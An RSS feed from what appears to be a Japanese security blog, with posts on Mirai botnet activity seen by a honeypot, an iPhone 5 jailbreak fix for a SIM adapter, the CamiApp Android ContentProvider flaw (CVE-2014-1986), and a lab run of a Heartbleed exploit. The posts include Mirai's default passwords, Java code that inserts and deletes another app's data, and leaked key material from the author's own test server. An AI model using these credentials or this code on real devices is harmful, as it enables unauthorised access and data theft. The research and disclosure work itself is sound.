<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>antimon</title>
    <link>https://antimon.xyz/index.xml</link>
    <description>Recent content on antimon</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>ja-JP</language>
    <copyright>&amp;copy; 2014-2017 magiauk.</copyright>
    <lastBuildDate>Sat, 18 Mar 2017 14:58:02 +0900</lastBuildDate>
    <atom:link href="https://antimon.xyz/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>日本におけるMirai BotNet</title>
      <link>https://antimon.xyz/2017/03/18/mirai/</link>
      <pubDate>Sat, 18 Mar 2017 14:58:02 +0900</pubDate>
      
      <guid>https://antimon.xyz/2017/03/18/mirai/</guid>
      <description>&lt;p&gt;約3年ぶりに更新する気になったので、心機一転Tumblrからこちらに移行して再開。&lt;/p&gt;

&lt;p&gt;先月から観測を始め、そろそろ1ヶ月になるということもありデータが溜まってきたのでまとめてみる。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://antimon.xyz/images/sensor_attackcount.png&#34; alt=&#34;攻撃カウント状況&#34; /&gt;&lt;/p&gt;

&lt;p&gt;設置した2月21日から3月17日までの攻撃カウントはこのようになっている。2月末から3月頭に活発になっていて、最近は落ち着いているようである。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://antimon.xyz/images/sensor_country.png&#34; alt=&#34;攻撃元国&#34; /&gt;&lt;/p&gt;

&lt;p&gt;攻撃元の国としてはロシアからの攻撃が一番多く全体の30.4%を占めている。その次にアメリカが28%、ノルウェー24.9%、中国2.3%、ドイツ1.9%、その他となっている。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://antimon.xyz/images/sensor_password.png&#34; alt=&#34;パスワード&#34; /&gt;&lt;/p&gt;

&lt;p&gt;これは攻撃に使用されたパスワードである。xc3511やvizxv、default、admin、juantech、54321、anko、xmhdipcといったパスワードが多い。これらはMirai BotNetが使用するパスワードであり、このことからMirai BotNetからの攻撃が多いと判断できる。&lt;/p&gt;

&lt;p&gt;攻撃元を日本とした場合はどうなのか。攻撃元が日本のIPアドレスは次のとおりである。&lt;/p&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;No.&lt;/th&gt;
&lt;th&gt;IPアドレス&lt;/th&gt;
&lt;th&gt;クライアント情報&lt;/th&gt;
&lt;th&gt;回線&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;

&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;106.166.193.XX&lt;/td&gt;
&lt;td&gt;SSH-2.0-sshlib-0.1&lt;/td&gt;
&lt;td&gt;KDDI KDDI CORPORATION&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;111.100.153.XX&lt;/td&gt;
&lt;td&gt;SSH-2.0-sshlib-0.1&lt;/td&gt;
&lt;td&gt;KDDI KDDI CORPORATION&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;113.158.61.XXX&lt;/td&gt;
&lt;td&gt;SSH-2.0-sshlib-0.1&lt;/td&gt;
&lt;td&gt;KDDI DION (KDDI CORPORATION)&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;119.104.196.XXX&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;KDDI KDDI CORPORATION&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;120.51.100.XX&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;VECTANT ARTERIA Networks Corporation&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;6&lt;/td&gt;
&lt;td&gt;183.180.76.XXX&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;VECTANT ARTERIA Networks Corporation&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;7&lt;/td&gt;
&lt;td&gt;202.215.132.XXX&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;VECTANT ARTERIA Networks Corporation&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;8&lt;/td&gt;
&lt;td&gt;153.145.139.XX&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;OCN NTT Communications Corporation&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;9&lt;/td&gt;
&lt;td&gt;153.163.189.XXX&lt;/td&gt;
&lt;td&gt;SSH-2.0-sshlib-0.1&lt;/td&gt;
&lt;td&gt;OCN NTT Communications Corporation&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;10&lt;/td&gt;
&lt;td&gt;153.231.161.XX&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;OCN NTT Communications Corporation&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;11&lt;/td&gt;
&lt;td&gt;52.199.19.XX&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;AMAZON-02 - Amazon.com, Inc.&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;12&lt;/td&gt;
&lt;td&gt;54.238.249.XXX&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;AMAZON-02 - Amazon.com, Inc.&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;13&lt;/td&gt;
&lt;td&gt;119.229.121.XX&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;K-OPTICOM K-Opticom Corporation&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;14&lt;/td&gt;
&lt;td&gt;218.42.252.XXX&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;K-OPTICOM K-Opticom Corporation&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;15&lt;/td&gt;
&lt;td&gt;125.199.86.XXX&lt;/td&gt;
&lt;td&gt;SSH-2.0-sshlib-0.1&lt;/td&gt;
&lt;td&gt;BIGLOBE BIGLOBE Inc.&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;16&lt;/td&gt;
&lt;td&gt;203.136.156.XXX&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;BIGLOBE BIGLOBE Inc.&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;17&lt;/td&gt;
&lt;td&gt;27.54.125.XXX&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;FBDC FreeBit Co.,Ltd.&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;18&lt;/td&gt;
&lt;td&gt;126.114.210.XX&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;GIGAINFRA Softbank BB Corp.&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;19&lt;/td&gt;
&lt;td&gt;163.44.168.XXX&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;INTERQ GMO Internet,Inc&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;20&lt;/td&gt;
&lt;td&gt;182.168.142.XX&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;SO-NET So-net Entertainment Corporation&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;21&lt;/td&gt;
&lt;td&gt;202.143.199.XXX&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;MABLE San-in Cable Vision CO.,LTD&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;22&lt;/td&gt;
&lt;td&gt;222.231.84.XXX&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;AS-ENECOM Energia Communications,Inc.&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;23&lt;/td&gt;
&lt;td&gt;60.128.11.XXX&lt;/td&gt;
&lt;td&gt;SSH-2.0-PuTTY_Release_0.63&lt;/td&gt;
&lt;td&gt;GIGAINFRA Softbank BB Corp.&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;24&lt;/td&gt;
&lt;td&gt;183.77.227.XX&lt;/td&gt;
&lt;td&gt;SSH-2.0-PuTTY_Release_0.67&lt;/td&gt;
&lt;td&gt;ASAHI-NET Asahi Net&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;現時点で24のIPアドレスを確認していて、このうち1から22までは行動等からMirai BotNetからの攻撃である。残りの2IPアドレスはMirai BotNetではなく攻撃者が存在している。&lt;/p&gt;

&lt;p&gt;使用している回線はKDDIやアルテリア・ネットワークス、OCN、Amazonというように特に特徴はみられない。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://antimon.xyz/images/sensor_japan.png&#34; alt=&#34;日本における攻撃元の位置情報&#34; /&gt;&lt;/p&gt;

&lt;p&gt;IPアドレスから求めた位置情報を地図にマッピングするとこのようになる。日本国内においてもMirai BotNetに感染している端末がすくなからずあることがわかる。今後これがどのように広がっていくのか引き続き観測していく。&lt;/p&gt;

&lt;p&gt;23および24については、別途詳細をまとめるつもりである。&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>下駄R-SIM7&#43;を使用したiPhone 5で発生する圏外病の解決方法</title>
      <link>https://antimon.xyz/2014/04/18/r-sim7/</link>
      <pubDate>Fri, 18 Apr 2014 09:49:00 +0900</pubDate>
      
      <guid>https://antimon.xyz/2014/04/18/r-sim7/</guid>
      <description>&lt;p&gt;R-SIM7+はいわゆる下駄とよばれるもので、SIMロックがかかっている端末でこの下駄を使用すると、他のキャリアのSIMを使用して通信することができる。&lt;/p&gt;

&lt;p&gt;SoftBankのiPhone 5はSIMロックがかかっているのでdocomoのSIMを挿してもdocomoのネットワークは使用できない。しかし、下駄を使用することでSoftBankのiPhone 5でもdocomoのSIMを挿してdocomoのネットワークを使用して通信することができるようになる。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://antimon.xyz/images/rsim7_iphone5.jpg&#34; alt=&#34;iPhone 5の写真&#34; /&gt;&lt;/p&gt;

&lt;p&gt;下駄は様々なメーカーが販売しているがR-SIM7+と呼ばれるものを使用している。基本的に、説明書通りに設定すれば使用できるのだが、たまに圏外になりそれ以降あれこれしても電波を掴まなくなり、最終的にSIMの抜き差しを繰り返したりして電波を掴むまで試行錯誤する必要が出てくる。いわゆる圏外病とよばれる症状になる。&lt;/p&gt;

&lt;p&gt;ということで、その解決方法はiPhone 5をjailbreakしてCarrier Bundleをいじるというもの。これにより圏外病の発生をなくすことができる。&lt;/p&gt;

&lt;p&gt;SoftBankのbundleはiOS7が動作しているiPhone 5の場合 /System/Library/Carrier Bundles/iPhone/Softbank_jp.bundle にある。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://antimon.xyz/images/rsim7_directory.png&#34; alt=&#34;ディレクトリのスクリーンショット&#34; /&gt;&lt;/p&gt;

&lt;p&gt;このディレクトリの中にある次のファイル&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;overrides_N41_N42.plist&lt;/li&gt;
&lt;li&gt;overrides_N41_N42.pri&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;これらを削除する。これらファイルはLTEのためのものであり、これらを削除することで設定が書き換わることがなくなるので圏外病が発生しなくなる(LTEに必要なものを削除するのでLTEは使用できなくなる)。&lt;/p&gt;

&lt;p&gt;また、このディレクトリにあるcarrier.plistを使用するキャリアに合わせて適宜変更しておくと便利。apnsの項目にAPNの情報を追加したり、type-maskを変更しておくとテザリングが使用できるようになったりする。&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Android版CamiAppにおけるContent Providerのアクセス制限不備の脆弱性 (CVE-2014-1986)</title>
      <link>https://antimon.xyz/2014/04/17/camiapp/</link>
      <pubDate>Thu, 17 Apr 2014 10:46:53 +0900</pubDate>
      
      <guid>https://antimon.xyz/2014/04/17/camiapp/</guid>
      <description>&lt;p&gt;CamiAppとは、コクヨS&amp;amp;Tが提供している専用のノートをこのアプリで撮影すると傾きなどを自動で補正してデータ化して管理してくれるアプリ。Android版とiOS版のアプリが提供されているが、Android版でアクセス制限不備の脆弱性が見つかり修正された。重要なことなのでもう一度、&lt;strong&gt;現在公開されているバージョンは修正済み&lt;/strong&gt;。&lt;/p&gt;

&lt;p&gt;対象バージョンのCamiAppを見てみると、AndroidManifest.xmlは次のようになっている。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;&amp;lt;provider android:authorities=&amp;quot;jp.co.kokuyost.CamiApp.Data.CamiDBProvider&amp;quot; android:name=&amp;quot;.Data.CamiDBProvider&amp;quot;&amp;gt;&amp;lt;/provider&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;provider要素にandroid:exported属性が付いていない。ということは、この属性値はデフォルト値が使用されることになる。&lt;/p&gt;

&lt;p&gt;provider要素のandroid:exported属性のデフォルト値は、android:minSdkVersion属性またはandroid:targetSdkVersion属性の値で次のように変わる。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;android:minSdkVersion属性またはandroid:targetSdkVersion属性の値が16以下の場合、true&lt;/li&gt;
&lt;li&gt;android:minSdkVersion属性またはandroid:targetSdkVersion属性の値が17以上の場合、false&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Googleの&lt;a href=&#34;https://developer.android.com/guide/topics/manifest/provider-element.html#exported&#34;&gt;API Guidesの該当箇所&lt;/a&gt;には次のように記述されている。&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;The default value is &amp;ldquo;true&amp;rdquo; for applications that set either android:minSdkVersion or
android:targetSdkVersion to &amp;ldquo;16&amp;rdquo; or lower. For applications that set either of these attributes to &amp;ldquo;17&amp;rdquo;
or higher, the default is &amp;ldquo;false&amp;rdquo;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;CamiAppのAndroidManifest.xmlをもう一度確認してみると&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;&amp;lt;uses-sdk android:minsdkversion=&amp;quot;7&amp;quot;&amp;gt;&amp;lt;/uses-sdk&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;このようにandroid:minSdkVersion属性が7となっている。その結果、provider要素のandroid:exported属性のデフォルト値はtrueになる。android:exported属性の値がtrueになるということは、このContentProviderは公開されることになり、他のアプリから自由にアクセスできる。&lt;/p&gt;

&lt;p&gt;例えば、次のようなContentProviderに接続してデータを追加するごく普通のコードで、CamiAppにデータを追加する事ができる。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;String sURI = &amp;quot;content://jp.co.kokuyost.CamiApp.Data.CamiDBProvider&amp;quot;;
ContentValues cVals = new ContentValues();
cVals.put(&amp;quot;uuid&amp;quot;, &amp;quot;11111111&amp;quot;);
cVals.put(&amp;quot;title&amp;quot;, &amp;quot;ここはタイトル&amp;quot;);
cVals.put(&amp;quot;comment&amp;quot;, &amp;quot;ここはコメント&amp;quot;);
getContentResolver().insert(Uri.parse(sURI + &amp;quot;/note&amp;quot;), cVals);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;また、同じようにデータを削除するごくごく普通の次のようなコードで、CamiAppのデータを削除できる。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;String sURI = &amp;quot;content://jp.co.kokuyost.CamiApp.Data.CamiDBProvider&amp;quot;;
getContentResolver().delete(Uri.parse(sURI + &amp;quot;/note_tag&amp;quot;), null, null);
getContentResolver().delete(Uri.parse(sURI + &amp;quot;/note&amp;quot;), null, null);
getContentResolver().delete(Uri.parse(sURI + &amp;quot;/tag&amp;quot;), null, null);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;他のアプリと連携してデータのやり取りを行うためにContentProviderを公開しているわけでは無いと思うので、脆弱性だったということになる。&lt;/p&gt;

&lt;p&gt;ちなみに修正されたバージョンのCamiAppのAndroidManifest.xmlを確認してみると次のようになっている。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;&amp;lt;provider android:authorities=&amp;quot;jp.co.kokuyost.CamiApp.Data.CamiDBProvider&amp;quot; android:exported=&amp;quot;false&amp;quot; android:name=&amp;quot;.Data.CamiDBProvider&amp;quot;&amp;gt;&amp;lt;/provider&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;android:exported属性が付いてfalseが設定されている。結果、ContentProviderは非公開になり他のアプリからアクセス出来ないように修正されていることが確認できる。&lt;/p&gt;

&lt;p&gt;しかし、API Level 8以下ではandroid:exported属性が無視され値がfalseでも他のアプリからアクセスできるという話があり、この修正だけでは不十分なような気もする。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://www.taosoftware.co.jp/blog/2011/10/android_contentproviderexport.html&#34;&gt;http://www.taosoftware.co.jp/blog/2011/10/android_contentproviderexport.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ただ、API Level 8以下の環境で実際に使用しているユーザがどれだけいるのかという疑問もあり、検証はしていない。&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>OpenSSLの脆弱性 (Heartbleedの問題) のexploitコードを試す</title>
      <link>https://antimon.xyz/2014/04/15/heartbread/</link>
      <pubDate>Tue, 15 Apr 2014 10:19:06 +0900</pubDate>
      
      <guid>https://antimon.xyz/2014/04/15/heartbread/</guid>
      <description>&lt;p&gt;exploitコードはいろいろ出ているけど、オレオレ証明書を使用してApache2でSSL通信できるようにして試してみた。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Ubuntu 12.10 amd64

&lt;ul&gt;
&lt;li&gt;192.168.1.10&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;秘密鍵、証明書要求、証明書は次のように生成。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ openssl genrsa 1024 &amp;gt; server.key
$ openssl req -new -key server.key &amp;gt; server.csr
$ openssl x509 -in server.csr -days 365 -req -signkey server.key &amp;gt; server.crt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;生成した鍵、証明書を使用するようApache2の設定を行う。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-apache&#34;&gt;SSLCertificateFile /etc/apache2/ssl/server.crt
SSLCertificateKeyFile /etc/apache2/ssl/server.key
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Apache2を再起動してSSL通信できることを確認したら、次のようにしてexploitコードを実行してみる。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ heartbleed-altered.py 192.168.1.10
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;取得したデータに何が含まれているか確認してみると、&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;//--中略--//
13e0: C1 9F F9 CF EE 4E 7D 04 86 46 7F EC 4E 50 50 36  .....N}..F..NPP6
13f0: BF 21 B1 E1 1C 79 B3 93 6F 55 ED A8 25 02 06 BC  .!...y..oU..%...
1400: 90 CC 26 1E 9C E9 24 76 3C 58 49 6A A3 D9 7D C1  ..&amp;amp;...$v&amp;lt;XIj..}.
1410: 2D 52 59 0A 0C 03 94 C2 1A 65 51 CF CA 73 AD 2B  -RY......eQ..s.+
1420: 42 73 75 84 35 D6 B8 7A 46 55 F5 57 DF 73 CF 25  Bsu.5..zFU.W.s.%
1430: 24 13 94 78 3B 9D 99 80 EC 58 6B 67 5A C4 F4 5D  $..x;....XkgZ..]
1440: F3 EC BE 57 32 62 FC 35 E7 21 A3 02 03 01 00 01  ...W2b.5.!......
1450: 30 0D 06 09 2A 86 48 86 F7 0D 01 01 05 05 00 03  0...*.H.........
1460: 81 81 00 AF 52 DC AA 63 5B C5 6C 5B E5 DB A7 D5  ....R..c[.l[....
1470: E5 EA D9 34 B9 EF 7C C0 73 21 DD 32 78 A2 32 FD  ...4..|.s!.2x.2.
1480: 8E 90 FC 38 D3 B3 8A F3 05 A4 6B 0E CA AB 70 2D  ...8......k...p-
1490: F5 4D 27 B1 BA FE 57 C1 66 E5 74 48 28 08 26 4A  .M&#39;...W.f.tH(.&amp;amp;J
14a0: 34 D4 3D 75 6E 8F BC 5D C5 0A 9A F8 04 0D 67 F8  4.=un..]......g.
14b0: CA D3 0B E7 4E EB 78 45 A5 D4 74 7C 45 0E 56 E5  ....N.xE..t|E.V.
14c0: 42 07 A5 78 28 C5 A2 6E FF 27 39 F9 18 A6 58 59  B..x(..n.&#39;9...XY
14d0: 72 FB 38 92 8F 3E 7F 1D 41 80 3D 15 41 16 CE A4  r.8..&amp;gt;..A.=.A...
14e0: A8 01 77 16 03 02 01 8D 0C 00 01 89 00 80 D6 7D  ..w............}
//--中略--//
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;長いので一部データを省略したけどこれは証明書とほぼ一致。さらに、&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;3d80: 50 00 00 00 00 00 00 00 5F 6C E8 B2 8B B0 4E AA  P......._l....N.
3d90: 2D 9A 4A E0 D7 6B 8F F6 B3 E2 0D 8E 05 83 FE AB  -.J..k..........
3da0: D4 5B 22 7D 91 71 B7 D2 23 0A 45 4C 52 CB 61 3A  .[&amp;quot;}.q..#.ELR.a:
3db0: A4 E1 E8 6D 51 0D 7E 68 27 00 55 17 BD C8 A9 15  ...mQ.~h&#39;.U.....
3dc0: A3 A9 56 21 58 A9 63 FC 00 00 00 00 00 00 00 00  ..V!X.c.........
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;と、これ&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;fa30: 50 00 00 00 00 00 00 00 3d 11 8d ab d6 f7 14 6b  P.......=......k
fa40: f1 19 ac 5c ba f5 62 31 60 02 d8 62 f8 05 d2 b1  ...\..b1`..b....
fa50: eb 0f 93 d8 93 62 10 0e c5 32 19 ea 53 0d 57 40  .....b...2..S.W@
fa60: 6c b6 8e 50 b2 01 97 d4 e3 e9 07 f9 cd ec 08 65  l..P...........e
fa70: c7 25 cc b0 c9 d3 b9 ed 0d ce 51 77 74 25 40 a5  .%........Qwt%@.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;は、秘密鍵のprime1とprime2とほぼ一致している。&lt;/p&gt;

&lt;p&gt;できれば秘密鍵をどーんとそのまま取得したいけど、タイミングとかそういう問題で簡単に取得できそうにはない。でも根気強くやっていれば取得できる可能性はあると思う。&lt;/p&gt;

&lt;p&gt;ちなみに、サイトにアクセスしてきたクライアントのセッションIDやcookieの内容とかはexploitコードを走らせていれば、秘密鍵よりは簡単に取得できた。&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>